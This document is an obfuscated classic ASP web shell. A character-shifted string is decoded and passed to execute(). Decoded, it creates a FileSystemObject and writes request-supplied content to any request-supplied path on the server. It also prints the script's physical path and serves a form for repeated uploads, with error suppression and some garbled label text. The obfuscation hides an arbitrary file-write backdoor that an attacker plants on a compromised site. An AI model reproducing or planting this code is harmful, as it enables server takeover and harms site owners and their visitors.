<%
hu="¡’¡’!ejn!pckGTP!¡’!ejn!gebub!¡’!ejn!pckDpvouGjmf!¡’!po!fssps!sftvnf!ofyu!¡’!Tfu!pckGTP!>!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!¡’!jg!Usjn)sfrvftu)#tzgeqbui#**=?##!uifo!¡’!gebub!>!sfrvftu)#dzgeebub#*!¡’!Tfu!pckDpvouGjmf>pckGTP/DsfbufUfyuGjmf)sfrvftu)#tzgeqbui#*-Usvf*!¡’!pckDpvouGjmf/Xsjuf!gebub!¡’!jg!fss!>1!uifo!¡’!sftqpotf/xsjuf!#=gpou!dpmps>sfe?tbwf!Tvddftt""=0gpou?#!¡’!fmtf!¡’!sftqpotf/xsjuf!#=gpou!dpmps>sfe?Tbwf!VoTvddftt""=0gpou?#!¡’!foe!jg!¡’!fss/dmfbs!¡’!foe!jg!¡’!pckDpvouGjmf/Dmptf!¡’!Tfu!pckDpvouGjmf>Opuijoh!¡’!Tfu!pckGTP!>!Opuijoh!¡’!Sftqpotf/xsjuf!#=gpsn!bdujpo>((!nfuipe>qptu?#!¡’!Sftqpotf/xsjuf!#±£¥ÊŒƒº˛µƒ=gpou!dpmps>sfe?æ¯∂‘¬∑æ∂)∞¸¿®Œƒº˛√˚;»ÁE;]xfc]y/btq*;=0gpou?#!¡’!Sftqpotf/Xsjuf!#=joqvu!uzqf>ufyu!obnf>tzgeqbui!xjeui>43!tj{f>61?#!¡’!Sftqpotf/Xsjuf!#=cs?#!¡’!Sftqpotf/xsjuf!#±æŒƒº˛æ¯∂‘¬∑æ∂#!¡’!Sftqpotf/xsjuf!tfswfs/nbqqbui)Sfrvftu/TfswfsWbsjbcmft)#TDSJQU`OBNF#**!¡’!Sftqpotf/xsjuf!#=cs?#!¡’!Sftqpotf/xsjuf!# ‰»Î¬Ìµƒƒ⁄»›;#!¡’!Sftqpotf/xsjuf!#=ufyubsfb!obnf>dzgeebub!dpmt>91!spxt>21!xjeui>43?=0ufyubsfb?#!¡’!Sftqpotf/xsjuf!#=joqvu!uzqf>tvcnju!wbmvf>±£¥Ê?#!¡’!Sftqpotf/xsjuf!#=0gpsn?#!¡’¡’"
execute(UnEncode(hu))
function UnEncode(temp)
but=1
for i = 1 to len(temp)
    if mid(temp,i,1)<> "¡’" then
If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(temp, i, 1)))
else
pk=asc(mid(temp,i,1))-but
            if pk>126 then
                    pk=pk-95
            elseif pk<32 then
                     pk=pk+95
             end if
             a=a&chr(pk)
end if
   else
             a=a&vbcrlf
   end if
next
UnEncode=a
end function
%>
